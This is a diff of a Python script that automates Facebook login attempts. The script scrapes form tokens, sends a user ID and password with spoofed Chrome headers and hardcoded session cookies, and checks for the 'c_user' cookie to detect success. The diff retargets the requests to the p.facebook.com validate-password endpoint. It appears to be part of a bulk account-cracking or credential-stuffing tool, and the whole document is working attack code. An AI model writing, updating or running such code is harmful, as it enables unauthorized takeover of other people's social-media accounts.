@@ -120,10 +120,12 @@ def ATOM(uid, pww, total_idz):
             session = requests.Session()
             requu1 = session.get('https://touch.facebook.com/')
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
-            'email': uid,
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            "lsd": re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
+            "uid": uid,
+            "next": "https://p.facebook.com/login/save-device/",
+            "flow": "login_no_pin",
+            "pass": pw,}
             cookies = {
             'datr': 'ES-iZxg35DqKN--TlZlh4Mwu',
             'sb': 'ES-iZ0S0Q3TXxuSylCRJGHa3',
@@ -132,18 +134,18 @@ def ATOM(uid, pww, total_idz):
             'fr': '1mMxyHSMiEop9Ml8c.AWVxZRcmWyw-RtLG8l6KA3DZMefXPbxl-XQojg.Bnp1ck..AAA.0.0.Bnucw6.AWWjS9bJZ00',
             'wd': '867x773',}
             headers = {
-            'authority': 'www.facebook.com',
+            'authority': 'p.facebook.com',
             'method': 'POST',
-            'path': '/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
+            'path': '/login/device-based/validate-password/?shbl=0',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://www.facebook.com',
+            'origin': 'https://p.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
+            'referer': 'https://p.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
             'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.127", "Chromium";v="133.0.6943.127"',
@@ -158,7 +160,7 @@ def ATOM(uid, pww, total_idz):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'viewport-width': '867',}
-            response = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',cookies=cookies,headers=headers,data=data,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies=cookies,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
